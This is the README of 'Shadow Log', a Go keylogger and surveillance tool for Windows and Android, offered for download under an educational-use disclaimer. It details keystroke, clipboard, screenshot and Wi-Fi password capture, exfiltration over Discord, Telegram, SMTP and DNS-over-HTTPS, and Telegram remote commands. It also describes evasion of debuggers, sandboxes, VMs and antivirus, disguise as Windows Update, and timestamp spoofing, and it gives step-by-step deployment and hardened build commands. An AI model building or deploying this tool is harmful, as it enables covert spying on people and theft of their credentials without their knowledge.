# Shadow Log: Discrete Activity Analytics

![Go](https://img.shields.io/badge/Language-Go-00ADD8?style=for-the-badge&logo=go&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Build](https://img.shields.io/badge/Build-Hardened-success?style=for-the-badge)
![Version](https://img.shields.io/badge/Version-4.0-blueviolet?style=for-the-badge)

**Official Website**: [shadowlog.iambgx.in](https://shadowlog.iambgx.in)

Shadow Log is a high-performance, native systems monitoring framework engineered for advanced cybersecurity research and authorized security demonstrations. Built entirely in Go with zero runtime dependencies, it provides an enterprise-grade approach to discrete activity capture, low-resource processing, and multi-channel exfiltration — hardened against reverse engineering, sandbox analysis, and endpoint detection systems.

---

> [!CAUTION]
> ### Legal and Ethical Warning
> **FOR AUTHORIZED EDUCATIONAL AND RESEARCH USE ONLY.**
> Unauthorized deployment of monitoring tools on systems or mobile devices you do not own or have explicit, documented permission to monitor is illegal and a violation of privacy laws (such as the Computer Fraud and Abuse Act). This includes both Windows PCs and Android devices. Covertly installing mobile tracking applications or intercepting notifications and communications on devices you do not legally own constitutes a severe criminal offense. This software is provided "as-is" for security professionals and students to study system hooks and secure exfiltration techniques. The developer assumes no liability for misuse, data loss, or legal consequences resulting from the use of this tool. By using this software, you agree to our official [Terms of Service](https://shadowlog.iambgx.in/terms) and [Privacy Policy](https://shadowlog.iambgx.in/privacy).

---

## 📋 Changelog — v4.0

### 🆕 New in v4.0
| Feature | Description |
|---------|-------------|
| **Intelligent Screenshot Batching** | Sensitive windows (login, bank, etc.) now capture a 3-shot burst to record full interactions; regular windows capture a single shot to reduce spam |
| **Wi-Fi Password Extraction** | The Wi-Fi monitor now extracts and logs plaintext passwords for connected networks |
| **Improved Telegram Polling** | Poll interval reduced to 30s with long-polling for near-instant command execution |
| **Decryptor Auto-Detect** | Smart MachineGuid-based decryption — automatically unlocks on the same machine without requiring a password |
| **Improved Lock Screen** | Show/hide password toggle, data file status indicator, auto-detect button, and detailed error diagnostics |
| **Reduced AV False Positives** | Decryptor no longer built with `-H windowsgui` flag — significantly reduces trojan heuristic detections |
| **Better Error Messages** | Decryptor now distinguishes between wrong password, missing data file, and cross-machine scenarios |
| **Site Troubleshooting FAQ** | Added comprehensive FAQ section covering AV exclusions, password recovery, and startup delay |
| **Fixed Download Button** | Site download URL now correctly points to the versioned release asset |

---

## Technical Features

### 🛡️ Multi-Layer Anti-Analysis

Shadow Log employs a defense-in-depth approach to remain undetectable:

| Layer | Technique | What It Defeats |
|-------|-----------|-----------------| 
| **Anti-Debug** | `IsDebuggerPresent`, `NtQueryInformationProcess` (debug port + flags), `GetTickCount64` timing gate | x64dbg, OllyDbg, WinDbg, kernel debuggers, single-stepping |
| **Anti-Sandbox** | RAM, CPU, screen resolution, mouse movement, disk size checks | AV sandbox environments (Windows Defender, CrowdStrike, SentinelOne) |
| **Anti-VM** | VMware/VirtualBox/QEMU/Xen driver and registry artifact detection | Virtualized analysis environments |
| **Anti-RE** | Debugger window class detection, suspicious neighbor executable scanning | IDA Pro, Ghidra, Wireshark, Fiddler, ProcMon |
| **Build** | Symbol stripping (`-s -w`), path removal (`-trimpath`), build ID erasure, manifest embedding | Static binary analysis, `strings.exe` extraction |

### 🔒 Stealth & OPSEC

- **Camouflaged Identity**: Process, registry, scheduled task, and mutex names mimic legitimate Windows Update components.
- **Covert Storage**: Encrypted data stored in `%LOCALAPPDATA%\Microsoft\Windows\WebCache\` — a real Windows directory, blending with legitimate browser cache files.
- **Registry Config**: Configuration encrypted and stored in `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced` — looks like a standard Explorer setting.
- **Network Stealth**: Randomized 60–180 second startup delay before first network connection, plus 2–8 second jitter between sync calls.
- **Anti-Forensics**: File timestamps spoofed to match Windows system file creation dates.
- **Zero-Dependency Architecture**: Runs natively without requiring external runtimes.

### 🌐 Universal Precision Capture

- **International Keyboard Support**: Leverages the Windows `ToUnicode` API for 100% accuracy across all regions.
- **Clipboard Monitoring**: Captures copied text with intelligent deduplication.
- **USB Drive Detection**: Logs removable drive insertions/removals with volume metadata.
- **Wi-Fi Network Logging**: Tracks network changes with SSID, BSSID, signal, and auth type.
- **Context-Aware Metadata**: Every event is correlated with the foreground process and window title.
- **Active Window Handle Caching**: Only queries process metadata when the foreground window changes.

### 🔐 Multi-Channel Exfiltration

- **4-Channel Delivery**: Discord webhooks, Telegram Bot API, SMTP email, and DNS-over-HTTPS fallback.
- **Remote Command & Control**: Real-time Telegram bot commands: `/kill`, `/pause`, `/resume`, `/status`, `/wipe`.
- **Password-Bound Local Encryption**: Local backups encrypted with **AES-256-GCM** with runtime-derived keys.
- **Log Rotation**: Automatic 50MB rotation to prevent disk exhaustion.

### 📸 Dynamic Surveillance Capture

- **Context-Triggered Snapshots**: Automatically captures the active window when sensitive keywords are detected.
- **Interactive Triggers**: Real-time capture on mouse clicks and window focus changes.
- **RAM-Only Processing**: Encodes JPEGs directly in memory using pooled buffers — zero disk I/O traces.
- **Active Window Bracketing**: Crops captures to the foreground window only (<200KB per event).

---

## 🚀 Setup & Deployment Guide

### Option 1: Quick Start (Security Analysts)

Download the latest **`ShadowLog_Release_v4.0.zip`** from the [Releases](https://github.com/BGx-11/ShadowLog/releases) page.

#### Phase 1: Installation
1. **Extract** the archive on the target host.
2. **Run** the core executable — the tool will **automatically request admin privileges** via a native Windows UAC prompt.
   - *No more manual "Run as administrator" required.*

#### Phase 2: Configuration
During setup, you'll configure:

- **Encryption Password (Required)**: Securely locks local forensic backups.

- **Discord Webhook (Optional but Recommended)**:
  1. Create a private channel (e.g., `#shadow-logs`) in your Discord server.
  2. Go to **Edit Channel** → **Integrations** → **Webhooks** → **New Webhook**.
  3. Copy the webhook URL and paste it into the setup wizard.

- **Telegram Details (Optional)**:
  1. Message `@BotFather` → `/newbot` → follow prompts → copy the **Bot Token**.
  2. Create a private group, invite your bot, send `/test` in the group.
  3. Visit `https://api.telegram.org/bot<TOKEN>/getUpdates` and copy the **Chat ID** (negative number).

- **SMTP Email (Optional)**:
  1. Enter your SMTP server (e.g., `smtp.gmail.com`), port (`587`), username, and app password.
  2. Specify the recipient email address.

  Enable to allow Telegram bot commands (`/kill`, `/pause`, `/resume`, `/status`, `/wipe`). `/pause` completely suspends all hooks (keystrokes, clipboard, screenshots, etc) and local storage.

#### Phase 3: Deployment
1. Click **Test Configuration** to verify each channel.
2. Click **Initialize Monitor** — the setup wizard will close, and the service will lock the configuration.
   - *Note: To defeat behavioral network scanners, the service implements a randomized **60 to 180 second sleep** before its first initialization. Please wait up to 3 minutes before expecting telemetry.*

---

### Android Installation Troubleshooting

If direct APK installation on your Android device fails or is blocked by security policies, you can use the included USB installer:
1. Enable **USB Debugging** on your phone (Settings → Developer Options).
2. Connect your phone to your laptop via USB cable and accept the debugging prompt on the phone screen.
3. Extract the release archive on your laptop and run **`install-mobile.bat`**.
4. The script will automatically bypass restrictions and install both the Monitor and Controller APKs via ADB.

---

### Option 2: Build from Source (Developers)

#### Prerequisites
- **Go 1.21+** (1.26+ recommended)
- **Windows 10/11**
- **rsrc**: `go install github.com/akavel/rsrc@latest` (for manifest embedding)

#### Compilation

Run the included build script:

```powershell
.\build.bat
```

Or build manually:

```powershell
# Generate manifest resource
rsrc -manifest WinUpdateSvc.manifest -o WinUpdateSvc.syso

# Core Monitor (with embedded manifest + hidden window)
go build -trimpath -ldflags "-s -w -buildid= -H windowsgui" -o WinUpdateSvc.exe main.go

# Forensic Decryptor
go build -trimpath -ldflags "-s -w -buildid=" -o Decryptor.exe decryptor/main.go

# System Uninstaller
go build -trimpath -ldflags "-s -w -buildid=" -o Uninstaller.exe uninstaller/main.go
```

---

## 🔍 Forensic Reconstruction

1. **Launch** `Decryptor.exe` on the host machine.
2. The decryptor opens a premium web dashboard at `http://localhost:58292`.
3. **Same machine, no custom password?** The decryptor will auto-detect and unlock immediately.
4. **Custom password set?** Enter your **Encryption Password** to unlock.
5. **Different machine?** You must enter the exact custom password from setup (MachineGuid keys are machine-specific).
6. **Analyze & Export**:
   - Live filtering by window title or keystroke content.
   - Visual artifact correlation for screenshot events.
   - Rotated log file support — automatically reads `.bak` archives.
   - JSON export for external forensic tools.

---

## 🧹 System Decommission

Run `Uninstaller.exe` to:
- Terminate all active monitor processes (current and legacy names).
- Remove registry Run key entries (all versions).
- Delete scheduled tasks (all versions).
- Purge encrypted telemetry from disk.
- **Clean registry-based configuration** (v2.2+).

Or use the **Remote Kill Switch** by sending `/kill` to your Telegram bot.

---

## Project Structure

```
shadowlog/
├── main.go                 # Entry point — anti-analysis, UAC elevation, timestomp
├── build.bat               # Hardened build script with manifest embedding
├── WinUpdateSvc.manifest   # UAC elevation manifest (requireAdministrator)
├── config/
│   ├── config.go           # AES-256-GCM encrypted config + registry storage
│   ├── paths.go            # Covert storage paths, log rotation, registry helpers
│   └── machine.go          # Machine-specific key derivation
├── monitor/
│   ├── monitor.go          # Core hooks, screenshot, multi-channel exfiltration
│   ├── clipboard.go        # Clipboard change monitoring
│   ├── usb.go              # USB drive insertion/removal detection
│   ├── wifi.go             # Wi-Fi network logging
│   ├── smtp.go             # SMTP email exfiltration channel
│   ├── doh.go              # DNS-over-HTTPS C2 fallback
│   └── killswitch.go       # Remote Telegram kill switch
├── persistence/
│   └── persistence.go      # Registry + scheduled task persistence
├── ui/
│   └── ui.go               # Setup wizard (web-based) with SMTP config
├── decryptor/
│   └── main.go             # Forensic log decryption dashboard
├── uninstaller/
│   └── main.go             # Complete system removal tool
└── site/                   # Landing page (Next.js)
```

---

## 📄 License

This project is licensed under the [GNU General Public License v3.0 (GPLv3)](LICENSE). See the [LICENSE](LICENSE) file for details.

---

<div align="center">

**Devansh Agarwal (BGx)**  
*Cyber Sec Student & Student Developer*  
[Portfolio](https://iambgx.in)

</div>
